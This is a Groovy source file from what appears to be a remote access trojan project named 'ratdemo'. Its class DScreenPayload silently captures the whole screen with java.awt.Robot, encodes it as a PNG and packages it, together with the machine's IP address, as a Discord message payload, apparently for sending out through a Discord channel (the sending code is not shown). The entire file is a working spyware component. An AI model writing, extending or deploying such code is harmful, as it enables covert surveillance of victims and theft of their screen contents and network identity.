package de.tudbut.ttd.ratdemo.discord.impl

import de.tudbut.ttd.ratdemo.Util
import de.tudbut.ttd.ratdemo.discord.DiscordPayload
import tudbut.parsing.TCN

import javax.imageio.ImageIO
import java.awt.*
import java.awt.image.BufferedImage

class DScreenPayload implements DiscordPayload {

    @Override
    String getAttachmentName() {
        return 'screen.png'
    }

    @Override
    byte[] getAttachment() {
        Robot robot = new Robot()
        BufferedImage image = robot.createScreenCapture(new Rectangle(0, 0, 10000, 5000))
        ByteArrayOutputStream out = new ByteArrayOutputStream()
        ImageIO.write(image, 'png', out)
        return out.toByteArray()
    }

    @Override
    TCN getContent() {
        TCN content = new TCN()
        content.set('username', Util.IP)
        content.set('content', 'Screen')
        return content
    }
}
